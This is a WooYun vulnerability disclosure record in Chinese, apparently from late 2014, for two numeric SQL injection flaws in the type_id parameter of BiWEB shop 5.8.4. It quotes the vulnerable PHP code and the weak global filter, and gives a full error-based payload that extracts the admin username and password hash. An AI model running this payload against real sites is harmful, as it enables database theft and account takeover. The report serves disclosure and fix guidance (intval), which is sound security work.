{"id": 42576, "wybug_id": "wooyun-2014-085302", "wybug_title": "BiWEB最新商城版2处注入漏洞打包", "wybug_corp": "BiWEB", "wybug_author": "路人甲", "wybug_date": "2014-12-02 17:31", "wybug_open_date": "2015-03-02 17:32", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-02：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-03-02：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： BiWEB最新商城版2处注入漏洞打包 详细说明：  在wooyun上看到了有人提了BiWEB的一个XSS漏洞： WooYun: BIWEB商城版XSS盲打cookie ，也有人提了SQL注入，我来找找其他的漏洞吧。去官网下BiWEB商城版最新的5.8.4来看看。 注入点是http://xxxx.com/product/list.php?type_id=1，其中type_id存在多处注入漏洞。第一处注入存在于/product/include/list.inc.php中的$objWebInit->getNavRouteInfo($_GET['type_id'])语句中；第二处注入存在于/product/block/child_brand.php中的$arrTopInfo = $objproduct->getBrandWithProductType($_GET['type_id'])语句中；下面来以第一处注入漏洞来说明，第二处的注入方法请参考我的这个漏洞：http://wooyun.org/bugs/wooyun-2014-085024先来看看BiWEB是怎么处理防注入的。首先BiWEB对用户输入进行了全局过滤filtrate.inc.php\n<?php//过滤GET或POST的值，去除两端空格和转义符号if ($_SERVER['REQUEST_METHOD'] == 'POST'){\tcheck::filtrateData($_POST,$arrGPdoDB['htmlspecialchars']);}elseif($_SERVER['REQUEST_METHOD'] == 'GET'){\tcheck::filtrateData($_GET,$arrGPdoDB['htmlspecialchars']);}?>\nfiltrateData()方法的实现见下面\n/**\t * filtrateData($ParamValue)\t * 作 用：递归去除所有值两边的空白\t * @author\tArthur <ArthurXF@gmail.com>\t * @param\t$ParamValue （需要过滤空白的数据）\t * @param\tarray\t$arrHtml （不需要过滤的数据key组成的数组）\t * @return\t去除空白之后的数据\t * 备 注：无\t */\tstatic function filtrateData(&$ParamValue,$arrHtml){\t\tif (is_array($ParamValue)){\t\t\tforeach ($ParamValue as $key=>$value){\t\t\t\tif(is_array($value)){\t\t\t\t\tcheck::filtrateData($value,$arrHtml);\t\t\t\t}else{\t\t\t\t\tif(v === 'v' || v === '' || strpos(p,v)) exit;\t\t\t\t\tif($key === 'v') {\t\t\t\t\t\techo v;exit;\t\t\t\t\t}\t\t\t\t\tif(count($arrHtml)){\t\t\t\t\t\tif(in_array($key,$arrHtml)) $ParamValue[$key] = trim($value);\t\t\t\t\t\telse $ParamValue[$key] = htmlspecialchars(trim($value), ENT_QUOTES);\t\t\t\t\t}else $ParamValue[$key] = htmlspecialchars(trim($value), ENT_QUOTES);\t\t\t\t}\t\t\t}\t\t}else{\t\t\t$ParamValue = trim($ParamValue);\t\t}\t}\n在/product/include/list.inc.php中有一处数字型的注入\n无关代码//取得产品分类的导航信息$arrNavInfo = array();if (!empty($_GET['type_id'])) {\t$objWebInit->getNavRouteInfo($_GET['type_id']);}无关代码\n继续去看看getNavRouteInfo()，在/product/class/product.class.php中\n/**\t * 通过 type_id ，递归取出 路由信息，用于导航 分类一 => 分类一一 => 分类一一一\t * @author\t嬴益虎 (whoneed@126.com)\t * @param\tint $type_id\t\t分类id\t * @return  array\t */\tfunction getNavRouteInfo($type_id){\t\tglobal $arrNavInfo;\t\t$strWhere = \"where type_pass=1 and type_id=$type_id\";\t\t$arrProductType = $this->getTypeList($strWhere);\t\t$arrTemp = array();\t\t$arrTemp['type_id']\t\t= $arrProductType['0']['type_id'];\t\t$arrTemp['type_title']  = $arrProductType['0']['type_title'];\t\tif($arrProductType['0']['type_parentid'] != 0){//不是顶级分类\t\t\t$this->getNavRouteInfo($arrProductType['0']['type_parentid']);\t\t\t$arrNavInfo[] = $arrTemp;\t\t}else {\t\t\t$arrNavInfo[] = $arrTemp;\t\t}\t}\n虽然有全局过滤，这里的type_id是数字型的，而全局过滤只是使用了htmlspecialchars对几个特殊符号进行了编码，这里不使用这几个特殊符号就可以绕过了。payload如下\nPayload:http://xxxx.com/product/list.php?type_id=1/**/or/**/(select/**/1/**/from/**/(select/**/count(*),concat(0x23,(select/**/concat(user_name,0x23,password,0x23)from/**/biweb_user/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)\n成功注入，管理员用户名及密码如下图中所示：\n\n   漏洞证明：  见 详细说明   修复方案：  intval   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}